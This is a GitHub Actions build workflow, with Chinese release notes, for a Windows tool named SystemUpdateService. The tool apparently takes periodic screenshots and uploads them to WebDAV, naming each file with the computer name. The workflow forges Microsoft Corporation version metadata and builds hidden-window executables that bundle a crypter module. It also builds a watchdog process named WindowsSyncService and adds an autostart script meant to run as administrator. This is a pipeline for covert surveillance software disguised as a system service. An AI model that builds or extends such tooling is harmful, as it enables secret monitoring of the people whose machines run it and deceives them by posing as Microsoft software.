name: Build SystemUpdateService

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build-windows:
    runs-on: windows-latest
    permissions:
      contents: write

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install mss==9.0.1 Pillow==10.1.0 requests==2.31.0 psutil==5.9.6 schedule==1.2.0 pyinstaller==6.8.0

    - name: Create version file
      run: |
        echo "VSVersionInfo(" > version.txt
        echo "  ffi=FixedFileInfo(" >> version.txt
        echo "    filevers=(10, 0, 19045, 1)," >> version.txt
        echo "    prodvers=(10, 0, 19045, 1)," >> version.txt
        echo "    mask=0x3f," >> version.txt
        echo "    flags=0x0," >> version.txt
        echo "    OS=0x40004," >> version.txt
        echo "    fileType=0x1," >> version.txt
        echo "    subtype=0x0," >> version.txt
        echo "    date=(0, 0)" >> version.txt
        echo "  )," >> version.txt
        echo "  kids=[" >> version.txt
        echo "    StringFileInfo([" >> version.txt
        echo "      StringTable(" >> version.txt
        echo "        u'040904B0'," >> version.txt
        echo "        [StringStruct(u'CompanyName', u'Microsoft Corporation')," >> version.txt
        echo "        StringStruct(u'FileDescription', u'Synchronizes system update logs')," >> version.txt
        echo "        StringStruct(u'FileVersion', u'10.0.19045.1')," >> version.txt
        echo "        StringStruct(u'InternalName', u'SystemUpdateService')," >> version.txt
        echo "        StringStruct(u'LegalCopyright', u'© Microsoft Corporation. All rights reserved.')," >> version.txt
        echo "        StringStruct(u'OriginalFilename', u'SystemUpdateService.exe')," >> version.txt
        echo "        StringStruct(u'ProductName', u'Microsoft Update Engine')," >> version.txt
        echo "        StringStruct(u'ProductVersion', u'10.0.19045.1')])" >> version.txt
        echo "      ])," >> version.txt
        echo "    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])" >> version.txt
        echo "  ]" >> version.txt
        echo ")" >> version.txt

    - name: Build SystemUpdateService
      run: |
        pyinstaller --onefile --noconsole --add-data "utils.py;." --add-data "crypter.py;." --name SystemUpdateService --version-file=version.txt SystemUpdateService.py

    - name: Build WindowsSyncService
      run: |
        pyinstaller --onefile --noconsole --add-data "utils.py;." --add-data "crypter.py;." --name WindowsSyncService --version-file=version.txt WindowsSyncService.py

    - name: Build ConfigWizard
      run: |
        pyinstaller --onefile --console --name ConfigWizard config_wizard.py

    - name: Prepare distribution
      run: |
        mkdir release
        copy dist\SystemUpdateService.exe release\
        copy dist\WindowsSyncService.exe release\
        copy dist\ConfigWizard.exe release\
        copy autostart.bat release\
        copy README.md release\
        copy INSTALLATION_GUIDE.md release\
        mkdir release\logs
        mkdir release\cache
        mkdir release\cache\failed_uploads

    - name: Create release archive
      run: |
        powershell Compress-Archive -Path release\* -DestinationPath SystemUpdateService-Windows.zip

    - name: Upload build artifacts
      uses: actions/upload-artifact@v4
      with:
        name: SystemUpdateService-Windows
        path: SystemUpdateService-Windows.zip
        retention-days: 30

    - name: Create Release
      if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master')
      uses: softprops/action-gh-release@v1
      with:
        tag_name: v${{ github.run_number }}
        name: SystemUpdateService v${{ github.run_number }}
        body: |
          ## SystemUpdateService Release

          ### 📦 包含文件
          - SystemUpdateService.exe (主程序)
          - WindowsSyncService.exe (守护进程)
          - ConfigWizard.exe (配置向导)
          - autostart.bat (安装脚本)
          - 完整文档和说明

          ### 🚀 使用方法
          1. 下载并解压 SystemUpdateService-Windows.zip
          2. 编辑 config.json 配置 WebDAV 信息
          3. 以管理员身份运行 autostart.bat
          4. 验证服务运行状态

          ### 📋 文件命名格式
          截图文件格式：`计算机名_YYYYMMDD_HHMMSS.webp`

          构建时间: ${{ github.event.head_commit.timestamp }}
        files: SystemUpdateService-Windows.zip
        draft: false
        prerelease: false
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
